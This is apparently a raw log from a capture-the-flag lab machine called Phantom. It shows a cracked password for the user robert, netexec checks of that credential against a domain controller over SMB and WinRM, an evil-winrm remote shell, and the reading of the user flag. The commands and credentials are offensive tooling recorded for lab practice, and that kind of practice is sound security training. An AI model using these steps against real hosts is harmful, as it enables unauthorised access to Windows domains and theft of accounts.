+Speed.#1.........:   939.4 kH/s (1.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 9861120/14344385 (68.75%)
+Rejected.........: 0/9861120 (0.00%)
+Restore.Point....: 9859072/14344385 (68.73%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: bONUS2007 -> b83100
+Hardware.Mon.#1..: Util: 61%
+
+Started: Thu Jun 11 11:11:05 2026
+Stopped: Thu Jun 11 11:11:49 2026
+                                                                                                                                                            
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+┌──(kali㉿kali)-[~/Documents/Phantom]
+└─$ netexec smb 192.168.56.100 -u robert  -p 'bLink182'          
+
+SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:False) 
+SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\robert:bLink182 
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/Phantom]
+└─$ 
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+
+┌──(kali㉿kali)-[~/Documents/Phantom]
+└─$ netexec winrm 192.168.56.100 -u robert  -p 'bLink182'
+
+WINRM       192.168.56.100  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:PHANTOM.THL)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.56.100  5985   DC01             [+] PHANTOM.THL\robert:bLink182 (Pwn3d!)
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/Phantom]
+└─$ 
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+┌──(kali㉿kali)-[~/Documents/Phantom]
+└─$ evil-winrm -i 192.168.56.100 -u robert -p 'bLink182'            
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\robert\Documents> whoami
+phantom\robert
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+*Evil-WinRM* PS C:\Users\robert\Desktop> type user.txt
+40c943b496ce2ad56cc7f6f2e86abe00
+*Evil-WinRM* PS C:\Users\robert\Desktop> 
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+    
+	
+	
